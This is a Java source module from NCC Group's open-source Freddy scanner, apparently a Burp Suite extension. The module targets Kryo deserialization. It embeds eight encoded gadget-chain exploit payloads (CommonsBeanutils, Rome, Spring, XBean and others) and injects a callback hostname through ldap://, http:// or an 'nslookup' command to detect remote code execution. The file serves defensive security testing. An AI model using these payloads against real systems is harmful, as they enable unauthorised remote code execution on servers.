// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.java;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

/***********************************************************
 * Module targeting the StdInstantiatorStrategy of the
 * Java Kryo library.
 *
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class KryoAltStrategyModule extends FreddyModuleBase {
    //CommonsBeanutils payload data
    private static final int COMBU_PAYLOAD_CMD_OFFSET = 169;
    private final String COMBU_PREFIX_B64 = decrypt("4gLTvsDH9t4ak6BOhUoP/dIovOEMb2UXhsbPF13MsKI5LwrQLOknpJrVsOdLikpywIM5LDBhnjo5g3CcMTJDGuOEIZPjUoMFVdn2G3TiMq4qat5zRhchxgDoAmHn4FuITsU3FXRJXu+nAJhiTCZm/5vLk8GfQrPL2WFPdArm4vwUKbppAHPZjscpEYl51bygh4ij6Zh3zGrFxBUEJIuWpsChBdcQBgPNKs3ZOQtXe0FE+nHpl40tN/b71qvXNfJvVLB8TQ0bF4fbVlF/g0N7rSYOK8Pcs+87Vtz/3wOHYZlVunzpfDOX/OMgFdzzEJr+");
    private final String COMBU_SUFFIX_B64 = decrypt("ApuLKJge7IuZmeKcs6ZsDTlwyB5k9EJudkhtIzMiX1UnMbhEwnw30Vb1zzNzbxwWbcA8j+RLm4Dw6nBIJxsGD6ptWjEkYtkIJclW5UjM2pYxhtHicPQ4nsga0Ui9qrplvZdNFtbK6bRGQ2joJlRI237ZQAR6REIwIFyCw7t0ZQul64Fu49ptwh4Kb7/+P5YHF7El8L5+6SIUonwRgHaGTQ==");
    //ImageIO payload data
    private static final int IMAGEIO_PAYLOAD_CMD_OFFSET = 575;
    private final String IMAGEIO_PREFIX_B64 = decrypt("4gLTvsDH9t4ak6BOhUoP/WDcPdDuBfh9A9M8eDTlIvA0WLO5ZMAXAPrth8l31tsZuGQTX/enNBGMlpHz3XHlVJ4ZuFbOoudWD7bwjaniff9EbaD0f+ANEm6OfleutoYlVdYdvvmyzfOCkm6BkmbFCzrIoy9/IyKJMf3lei+5SxP1BW1fM12uxPcRkuIEZW1c9uobb97ZlPoYFBWEbkJPXWrmWjnHR9fn+DTnoDTxf3VmvD/afCPGDLLqWYQf589H//RJH9nAv3N2XtOXqdV/KzYz78CyIRIQ1Szz/wk/Z8NqhEmM9+WmS2qzdJ7ck7fszZVzsnfq6VMi74KZNsz7YI5VbK4kXfbo0+1wiH3jH+ff5B2tZthDUveAC8+9wiNk0cOKB7SkvaqekS3NkhOc+Pws+aCYRS+GB2R0hCQ+hNz1R/AiCURMRWs8zqf99bl9OGX1mVo3o784wZRcpmTwBF1fl2GiN8SrV01PgGjv3qddDSqIZzNhaHm95LFDTGOu3qn5fkq0c24HINkfm7fhoqkS89suERIC5bKwIXEBNSWdz/f85IhMpAAjsV+k70nIdyKJGWjZtMH/3Y6SxnJmtPeMgeLqaPprhbGJb22a9veB2pFr66m+McChoEGaQtJBP0oAhxuPubQMv699fu/TmPbaDuUBClr0ddUaoeI9KRlgZPS3GR1AyeO1bQK9yz5X/GBNDLfUY2ukApUfLpQohVk7ND6IKeziOZKfhil1kUyYa9acKZB7IO60yNQap1qWav5AIFwEqZZixfnX3L5vnRtLKZxRAEIQi6hhSOz0cBQz+0YcTI1Sa4zjhI9sSCiDznJ9ORAiBAF4g24Y0UfeUm2Bekh/anTaSyg7VwNqa73FjQ5yg3x1AJRJc6h/YdVit8DwbquzKPYqvVxHAUT6iOxLnuMUmTfszXhcCAFQ+UbroJsVAA+Mck6KyXy85xmpdufC6ZRWIPe5UVIKLgTqcTpUk5wYMQTq1EtjbhjLdvOgnNzalb+N0D1ZbtgoOXAr5RANJ0sm+9SpC3prNIAKgQ==");
    private final String IMAGEIO_SUFFIX_B64 = decrypt("/q/qrYWTdoIPUUfKXFghSYN/ZnMuxSyMpAF7CufZ3un/6HTBE9KxSND5SLtJYqtJFh3lWv5Amc5hDTPDBhau4y1T77Rlw1udfNYwly1Lt/+0q8N8fdpFGf29qUX/c0xBZV9VL5da3Tu2JJzkstSKQSDrdKwlcLq6kgjiicm34Ta1wI8u+qylB0LhUy5nzWqsUfZaUsVrTycKOlsDYw8Cdg==");
    //LazySearchEnumeration payload data
    private static final int LSE_PAYLOAD_CMD_OFFSET = 597;
    private final String LSE_PREFIX_B64 = decrypt("4gLTvsDH9t4ak6BOhUoP/WDcPdDuBfh9A9M8eDTlIvA0WLO5ZMAXAPrth8l31tsZuGQTX/enNBGMlpHz3XHlVJ4ZuFbOoudWD7bwjaniff9EbaD0f+ANEm6OfleutoYlVdYdvvmyzfOCkm6BkmbFCzrIoy9/IyKJMf3lei+5SxP1BW1fM12uxPcRkuIEZW1c9uobb97ZlPoYFBWEbkJPXWrmWjnHR9fn+DTnoDTxf3VmvD/afCPGDLLqWYQf589H//RJH9nAv3N2XtOXqdV/KzYz78CyIRIQ1Szz/wk/Z8NqhEmM9+WmS2qzdJ7ck7fszZVzsnfq6VMi74KZNsz7YI5VbK4kXfbo0+1wiH3jH+ff5B2tZthDUveAC8+9wiNk0cOKB7SkvaqekS3NkhOc+Pws+aCYRS+GB2R0hCQ+hNz1R/AiCURMRWs8zqf99bl9OGX1mVo3o784wZRcpmTwBF1fl2GiN8SrV01PgGjv3qddDSqIZzNhaHm95LFDTGOu3qn5fkq0c24HINkfm7fhoqkS89suERIC5bKwIXEBNSW3hi27eXNRrji4sbX44xdbnNfecu7MAmZwlYIFLRmrKVB6COkLNZfwkD4C/SCf8eHkmbBQ0utTzzc9+Umjrg4eI79jlzh4k3FNgEl3k0CSDQqnhSfFyvZmscmE7w4fNHcQvw5Lg8esb9vSLFNa9ogKVumHb9ohfSUkktfLSngpMpHncPPVbxP4bB1s5YJ71ciSlAg8+TBa0IuhmrbvKDMzzDGSeKAAg3LOvgnnf5GuiEQiqX+CuDQ7tGjfkJeO3GdKFvzIqVYOT0huJ7vqsg0zSiEUTxZCzZ+iz135oT12FTvA/X5fonO3r+H6bfhlCx+BykfXp5xCtvcLLMq95lLxSMI2zJV52pHEQAy0IUy9t6D2h68DfCkhNYUOSDuKN3dm79ylICn1ZfyWYYPElmRiujvxlcIia5SxRvG8iUibHhg6m3eXddIKd2AdbfXCCM1bmJmqEgmcpDzb1x18fxlzvAL3Jv5Ur4/tODq7GIhNkK0GXKOUynPI2tgPgeB0rFY=");
    private final String LSE_SUFFIX_B64 = decrypt("RmGJK+ge0Q4GUqVlOFv4v4C+AvHEtm+6Z1w34E5ueBUUDhM1fKAlIR7LCh3RU0/Cn1pqkO46GuVw6+cGfHpWeBfJTYUQFnCAtttALOrhE8/mo0+iF6NQMOt8PnGL+AbnjZ2lWr5hPU4KL3JySFtw8s5LTrGzMuRUPfbkRwqWrCyeKtZiN2pUIEPDVGuIPZTdpx94PWAvg1Wwi3aKKHzFawcEQQoFZIH9lMQwrWg1tLNwBu907FX++3hWoCMMRT/rzEoc2Owfk5H0f/scfA1aBK7vwri8WWJELTJMImi9xs6QCIpjOaW9dIWosh6dYBF2GhnyKGnVZRKfpQ8Zdp7CBcyZgJ+D7V1mHMJeNxizcRyOs/Ccv9kCEvg9e02hlzNyZEtZbeXdDNBytx2FkPbAoqUQGHeJqxhmqPKo8221SY951kXzZITViVgtHVYOKcnoiudCC0CYqQetnj0UeRi5pA==");
    //Resin payload data
    private static final int RESIN_PAYLOAD_CMD_OFFSET = 191;
    private final String RESIN_PREFIX_B64 = decrypt("4gLTvsDH9t4ak6BOhUoP/cODp7PIx8bJO8XTP/zfDG7uWY5nM1rB5Vsyd6pPq08L6/lNk13haSA6lIFaUUQhYrWoiHw0XQKHQ2RJuAccSfPZ1ZJCmyRgam2qBqLych2bBrhgG6QclaP1Y8mk0bMTexm8ylkkV7Htyz0LdEZQJRVUKbA1nJJm1VFLfmDdCz3jm8Dkdic0uKU1MAWGOzp3KlT8sdROpjWyIHfy/YJlbBAJO11D/yHS6eE/+JsZx6+S1c4yDzTaNwH3R99bL2eBgqNtCRXhe2iz9IZ5QTi7VZabJP2a7Y1PP4VpBK81SkbqqTFYqOKua7yMj1DnAmmxWeUQDSdLJvvUqQt6azSACoE=");
    private final String RESIN_SUFFIX_B64 = decrypt("b+pI+R+Qr8tv+TjOu/q467CRxAP549HJ9g44XHfsHpVmX8tzUSrYPRC+HABNMI+C9BG9LorYnPx1ZyhGFQGu9GymJXwlBhltm1v5B1n8Axu/rnqYR2BWsR7z2Dr8vz4muz8YC8pTyv5sfqZDam0QCqytvHiFQppob/yMOauKe/NmnLbGhHdFZ5AYNp4I/vreuTdU7WZg884ouaeGs6cOsKEshpxHcGwf2mIFKe7pLpXlEA0nSyb71KkLems0gAqB");
    //Rome payload data
    private static final int ROME_PAYLOAD_CMD_OFFSET = 158;
    private final String ROME_PREFIX_B64 = decrypt("4gLTvsDH9t4ak6BOhUoP/cODp7PIx8bJO8XTP/zfDG7w7z772fYxV0b8q4lwFdjXmJev0BLmW23fdPHUyxowqolCW5pFTeO7ivbxX30Ji8fOu9IzqkX1zoN0keoLladTbo5FvceCeGOCeUlRly12hSckxFfo5q6/H/fz59vmyvd1iAi8Md3VHsrKAdQ1dIrtuUT/igVP9hz+n8sUFfljMCp7aQWTXWjPPwkrz0OAUlxyu9Uc4rK1SfTfSRIX62y//YbIUeACObSJXHxJnaJAP2v+a1eSDrOhbeKBZO9c1ok=");
    private final String ROME_SUFFIX_B64 = decrypt("ApuLKJge7IuZmeKcs6ZsDTlwyB5k9EJudkhtIzMiX1UnMbhEwnw30Vb1zzNzbxwWbcA8j+RLm4Dw6nBIJxsGD6ptWjEkYtkIJclW5UjM2pYxhtHicPQ4nsga0Ui9qrplvZdNFtbK6bRGQ2joJlRI237ZQAR6REIwIFyCw7t0ZQtxv3/USvP0BNYDGzSD1sHcVbp86Xwzl/zjIBXc8xCa/g==");
    //SpringAbstractBeanFactory payload data
    private static final int SABF_PAYLOAD_CMD_OFFSET = 1445;
    private final String SABF_PREFIX_B64 = decrypt("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");
    private final String SABF_SUFFIX_B64 = decrypt("NGkft/kBtyTOq+FWED4VzMdl/B25+kTPSnksYiyGdJVG7WjwKZf5xrtXLEbsMmVl7oiJh9MlDUSnAC1OAkPT1qbX4/w+H8sCDPGKt2M4lNbrR4GjAynYyg9vSV+DUBsb");
    //SpringPartiallyComparableAdvisor payload data
    private static final int SPCA_PAYLOAD_CMD_OFFSET = 562;
    private final String SPCA_PREFIX_B64 = decrypt("4gLTvsDH9t4ak6BOhUoP/bbJ5dCspIvw9Y/cU4Yji0uOAkIH/dsO2ysuXYKaXnIn/rI0d+3w5b62/ikqTAMjBclrstEQ8Gsbyrl6Qh9Kb8TFqrO7VrOOD746svvKFJlPD0qdeX1MaRGvoEKIf34Rh44CQgf92w7bKy5dgppecifPXkUUq1nYmNKIuWYzN/nBcczK+k8XVQjLy0ZR4WvfMSw0xzNAsZDkmKfziYdnxl/AYxoHMdQMyUittADfAtMB00CRBgNiWG4KehaA7adzuOI02qotQemZUjptTa9eGZlHm94qY2Z8UmFEIZt3PIK843N61gD8GJ7uS9S0EV9zuHMS8wKNKQmiDKJoLKJOnjqZXijpiyNlXphJUlyoIg6gmNAiEV55FXyeO/s+vK7reg714Iz0DMp30H7OU23PBe6yTcnsPhhlKJNwe8bjZU3xLSPMy0JySnCowyixpXgjGi2Z1abPY17qd6qW/6XKavnKF8FKa/Hf5RK8TfwEyn2sbiat8W24rzeUQw19WAqL3h/nMDpAucCOiO1Tb7xgms7YBtYWpM6NsPtSkcNKQ+mRGBS7ftDQuSWQDgSzcOktqy1nyXmq/a/KbZeNQX/ePdwaNuFdCmsIQjJtCZN5MDaUFhPkq8Cu+nMRqqFFWnfxbg1gHyWt2yq+nSOQQ3JkbrR9i6tf34QGejQIBelNZiCaCriAu9XfUH58Q7JKOgsmQMF9LP7lub+vAMvIRBbWS1e7JuNBEz/U2YiO3bfCRZS0CjEQQUezA4mIzQQYy8TNDEkYoxiEj67wpq8uLZbISY6ZXijpiyNlXphJUlyoIg6gAGBjp07YftvSCdxHBgkbwVsaqVHS+HMXG+XPeEm5hOMuvxVJtRDn1XsM5VVMMcbNgEhBmmBe3WHy1ZDSFAaTjGHkC1D8KUnu+Z6pcjrI854TBnjtAkXUwL/+TwiY74OAFqTFK64ytnC/3+ZPPDHwART2ETEDza9dyTnnHLIj4rLlEA0nSyb71KkLems0gAqB");
    private final String SPCA_SUFFIX_B64 = decrypt("STaY0W6NgU9DrqQValk6iKe8wkADBgFH5DhYYWKa4JlNQeKXozqR8CK5/XisNhOXfcXMBMT4AHPKo0dZbtCEwEGbaL4gZ6sHJPdd1ujyhbMxWgDL35Q+Zpt2QwY/3K78Qp3ItLgH1M3m1PAsrJPsWsOBVrunWQfnBcBGTTtLMrk6YmjxvyNFnP4ZnXmbIIBUjyF1IdwlCdPktOxBJzxD+OUQDSdLJvvUqQt6azSACoE=");
    //XBean payload data
    private static final int XBEAN_PAYLOAD_CMD_OFFSET = 196;
    private final String XBEAN_PREFIX_B64 = decrypt("4gLTvsDH9t4ak6BOhUoP/bbJ5dCspIvw9Y/cU4Yji0uOAkIH/dsO2ysuXYKaXnIn/rI0d+3w5b62/ikqTAMjBclrstEQ8Gsbyrl6Qh9Kb8TFqrO7VrOOD746svvKFJlPAghl3U+RRAUGKO+H26NLYnbvs8HorV8KWaPblSxUsiUGfDAXetgvetGDAlLA5ZsetajHFuUB6AoQUa5rZzz5Y2eSzyftvpPv6L8yrGrZpZ2/gKHpQYcg7wUm6bmAZZTmfqus2VcHhG0xbLyIYzFzvDhRns3MdWyZ8vykehNVEPuIwq02zdASuWkSz45bTL8d4LjdlVDeiIoUI+0ueYMlKil/Ym90eaEtGTyBuMVgud0=");
    private final String XBEAN_SUFFIX_B64 = decrypt("XNSeFp/jy8RijEk9uyU7ug2u3WFBaz6XAoGRxkoU1El/9+R/weFwg9GX2U8rxSelT9eBh6CcmxLgQejRfZT1RPPnMAG+TYhno2N60JgEnBMrpTPWKYZmNmEta+7gOBsblAJ0LVJO/D6PZyF0eZGqCF/wRmc7M730VZnHp4ZS6522Fa76Zbz6msw1p1x6GBro9wizokytssqaGlPiCX1+Vr1jsZaAZyDXcbJWuw6r8n9ATuHzQBH1zFZnFC3PM/owRUXo7V0wBipL6cwtVMHGZw==");
    private byte[] COMBU_PAYLOAD;
    private byte[] IMAGEIO_PAYLOAD;
    private byte[] LSE_PAYLOAD;
    private byte[] RESIN_PAYLOAD;
    private byte[] ROME_PAYLOAD;
    private byte[] SABF_PAYLOAD;
    private byte[] SPCA_PAYLOAD;
    private byte[] XBEAN_PAYLOAD;

    protected void initialiseModule() {
        setName("Kryo-StdInstantiatorStrategy");
        setPlatform(TargetPlatform.JAVA);
        setModuleIsRCECapable(true);
        setDescriptionCaveats("");
        setRemediationDetail("");
        setSeverity(SeverityRating.HIGH);

        //Initialise payload buffers
        COMBU_PAYLOAD = buildBinaryPayloadBuffer(COMBU_PREFIX_B64, COMBU_SUFFIX_B64, false);
        IMAGEIO_PAYLOAD = buildBinaryPayloadBuffer(IMAGEIO_PREFIX_B64, IMAGEIO_SUFFIX_B64, false);
        LSE_PAYLOAD = buildBinaryPayloadBuffer(LSE_PREFIX_B64, LSE_SUFFIX_B64, false);
        RESIN_PAYLOAD = buildBinaryPayloadBuffer(RESIN_PREFIX_B64, RESIN_SUFFIX_B64, false);
        ROME_PAYLOAD = buildBinaryPayloadBuffer(ROME_PREFIX_B64, ROME_SUFFIX_B64, false);
        SABF_PAYLOAD = buildBinaryPayloadBuffer(SABF_PREFIX_B64, SABF_SUFFIX_B64, false);
        SPCA_PAYLOAD = buildBinaryPayloadBuffer(SPCA_PREFIX_B64, SPCA_SUFFIX_B64, false);
        XBEAN_PAYLOAD = buildBinaryPayloadBuffer(XBEAN_PREFIX_B64, XBEAN_SUFFIX_B64, false);

        //Register active scan payloads (passive scan is handled by KryoPassiveDetectionModule)
        registerActiveScanExceptionPayload(new byte[]{0x04}, "com.esotericsoftware.kryo.KryoException");

        registerActiveScanCollaboratorPayload(PN_COMBEANUTILS, true);
        registerActiveScanCollaboratorPayload(PN_IMAGEIO, true);
        registerActiveScanCollaboratorPayload(PN_LAZYSEARCH, true);
        registerActiveScanCollaboratorPayload(PN_RESIN, true);
        registerActiveScanCollaboratorPayload(PN_ROME, true);
        registerActiveScanCollaboratorPayload(PN_SPRINGABF, true);
        registerActiveScanCollaboratorPayload(PN_SPRINGPCA, true);
        registerActiveScanCollaboratorPayload(PN_XBEAN, true);
    }

    protected byte[] generateCollaboratorBytePayload(String payloadName, String hostname) {
        switch (payloadName) {
            case PN_COMBEANUTILS:
                return generateBinaryPayload(COMBU_PAYLOAD, COMBU_PAYLOAD_CMD_OFFSET, "ldap://" + hostname + "/", false);

            case PN_IMAGEIO:
                return generateBinaryPayload(IMAGEIO_PAYLOAD, IMAGEIO_PAYLOAD_CMD_OFFSET, "nslookup " + hostname, false);

            case PN_LAZYSEARCH:
                return generateBinaryPayload(LSE_PAYLOAD, LSE_PAYLOAD_CMD_OFFSET, "http://" + hostname + "/", false);

            case PN_RESIN:
                return generateBinaryPayload(RESIN_PAYLOAD, RESIN_PAYLOAD_CMD_OFFSET, "http://" + hostname + "/", false);

            case PN_ROME:
                return generateBinaryPayload(ROME_PAYLOAD, ROME_PAYLOAD_CMD_OFFSET, "ldap://" + hostname + "/", false);

            case PN_SPRINGABF:
                return generateBinaryPayload(SABF_PAYLOAD, SABF_PAYLOAD_CMD_OFFSET, "ldap://" + hostname + "/", false);

            case PN_SPRINGPCA:
                return generateBinaryPayload(SPCA_PAYLOAD, SPCA_PAYLOAD_CMD_OFFSET, "ldap://" + hostname + "/", false);

            case PN_XBEAN:
                return generateBinaryPayload(XBEAN_PAYLOAD, XBEAN_PAYLOAD_CMD_OFFSET, "http://" + hostname + "/", false);
        }
        return null;
    }
}
